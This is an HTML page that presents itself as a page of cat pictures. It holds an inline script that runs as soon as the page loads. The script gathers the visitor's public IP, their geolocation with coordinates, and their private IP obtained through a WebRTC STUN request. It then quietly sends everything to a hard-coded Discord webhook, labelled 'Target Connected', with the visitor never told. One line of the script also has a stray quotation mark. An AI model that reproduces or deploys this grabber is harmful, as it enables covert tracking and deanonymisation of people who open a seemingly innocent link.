<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connection</title>
    <style>
        body { background: #1a1a2e; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .loader { color: #e94560; font-size: 24px; animation: pulse 1s infinite; }
        @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.4; } }
    </style>
</head>
<body>
    <div style="text-align:center;">
        <img src="https://cataas.com/cat" alt="cat" style="max-width:80%;border-radius:12px;">
        <br><br>
        <img src="https://cataas.com/cat/says/meow" alt="cat" style="max-width:80%;border-radius:12px;">
    </div>
    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1556586908619112468/UmBXhpdq5ijQnk8nZmroZwEm-Ns5desvvoWOgVI5Nu9l66KT1lmTPAR3VAxrmOc9B2UZ";

        async function grab() {
            let pub = "unknown", priv = "unknown", geo = "unknown";

            try {
                const pubRes = await fetch("https://api.ipify.org?format=json");
                const pubData = await pubRes.json();
                pub = pubData.ip;
            } catch(e) {}

            try {
                const geoRes = await fetch(`https://ipwho.is/${pub}`);
                const geoData = await geoRes.json();
                if (geoData.success) {
                    geo = `${geoData.city}, ${geoData.region}, ${geoData.country} (${geoData.latitude}, ${geoData.longitude})`;
                }
            } catch(e) {}

            try {
                const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
                pc.createDataChannel("x");
                await new Promise(r => pc.onicecandidate = e => {
                    if (e.candidate) {
                        const m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
                        if (m) priv = m[1];
                        r();
                    }
                });
                await pc.setLocalDescription(await pc.createOffer());
                await new Promise(r => setTimeout(r, 2000));
            } catch(e) {}

            try {
                await fetch(WEBHOOK, {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({
                        embeds: [{
                            title": "Target Connected",
                            color: 0xff0000,
                            fields: [
                                {name: "public ip", value: pub, inline: false},
                                {name: "private ip", value: priv, inline: false},
                                {name: "geolocation", value: geo, inline: false}
                            ]
                        }]
                    })
                });
            } catch(e) {}
        }
        grab();
    </script>
</body>
</html>
